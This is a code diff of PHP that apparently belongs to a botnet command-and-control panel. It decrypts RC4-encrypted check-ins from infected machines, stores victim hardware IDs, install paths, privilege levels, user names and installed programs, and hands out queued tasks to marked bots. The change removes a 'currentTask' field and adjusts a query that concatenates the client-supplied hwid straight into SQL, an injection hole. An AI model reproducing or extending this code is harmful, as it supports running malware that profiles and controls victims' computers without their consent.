@@ -19,7 +19,7 @@ function decryptClient($rc4Key, $info)
                     "cp" => "cpu", "gp" => "gpu", "hw" => "hwid",
                     "ip" => "installPath", "os" => "operatingSystem", "pr" => "privilege",
                     "ra" => "ram", "un" => "userName", "vr" => "vram",
-                    "fp" => "foundPrograms", "ct" => "currentTask");
+                    "fp" => "foundPrograms");
         foreach ($keys as $key => $value)
         {
             foreach ($info as $iKey => $iValue)
@@ -62,12 +62,12 @@ if ($gate == 1)
         }
         else
         {
-            $u = $odb->prepare("UPDATE clients SET lastKnock = UNIX_TIMESTAMP(), buildVersion = :buildVersion, currentTask = :currentTask, installPath = :installPath, privilege = :privilege WHERE hwid = :h");
-            $u->execute(array(":buildVersion" => $clientInfo["buildVersion"], ":currentTask" => $clientInfo["currentTask"], ":installPath" => $clientInfo["installPath"], ":privilege" => $clientInfo["privilege"], ":h" => $clientInfo["hwid"]));
+            $u = $odb->prepare("UPDATE clients SET lastKnock = UNIX_TIMESTAMP(), buildVersion = :buildVersion, installPath = :installPath, privilege = :privilege WHERE hwid = :h");
+            $u->execute(array(":buildVersion" => $clientInfo["buildVersion"], ":installPath" => $clientInfo["installPath"], ":privilege" => $clientInfo["privilege"], ":h" => $clientInfo["hwid"]));
         }
         /////////////////////////////////////////////////////Incomplete Task Managment////////////////////////////////////////////////////////////////
         $tasks = $odb->query("SELECT * FROM tasks ORDER BY id");
-        $clientMark = $odb->query("SELECT mark FROM clients WHERE hwid = \"".$clientInfo['hwid']."\"");
+        $clientMark = $odb->query("SELECT mark FROM clients WHERE hwid = \"".$clientInfo['hwid']."\"")->fetchColumn(0);
         while ($task = $tasks->fetch(PDO::FETCH_ASSOC))
         {
             if ($task['status'] == "1" && $clientMark == "1")
